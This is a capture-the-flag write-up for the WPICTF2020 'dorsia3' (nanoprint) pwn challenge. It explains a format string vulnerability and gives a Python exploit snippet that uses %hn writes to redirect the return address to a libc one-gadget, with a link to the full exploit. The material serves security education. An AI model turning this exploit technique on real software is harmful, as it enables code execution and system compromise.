## dorsia3 (250pt)

### Description

> http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The third card. 
>
> nc dorsia3.wpictf.xyz 31337 or 31338 or 31339 
>
> made by: awg

### Attachment

[nanoprint](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WPICTF2020/pwn/nanoprint/nanoprint), [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WPICTF2020/pwn/nanoprint/libc.so.6)

### Analysis

The third card:

![](http://image.taqini.space/img/cap_dorsia_00:00:53_02.jpg)

`system-288` is an address of `one gadget` in libc and `a` is a buffer in stack. There is a format string vulnerability and we can use it to modify return address to the address of `one gadget`.

### Solution

very common fmtstr attack:

```python
stack = eval(p.recv(10))
system = eval(p.recv(10))
info_addr('stack',stack)
info_addr('system',system)
ret = stack+0x71
info_addr('ret',ret)

payload = '%%%dc%%14$hn'%((system)&0xffff) +'%%%dc%%15$hn'%((((system>>16)-(system))%0x10000)&0xffff)
payload = payload.ljust(29,'B')
payload += p32(ret) + p32(ret+2)

sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/WPICTF2020/pwn/nanoprint) 


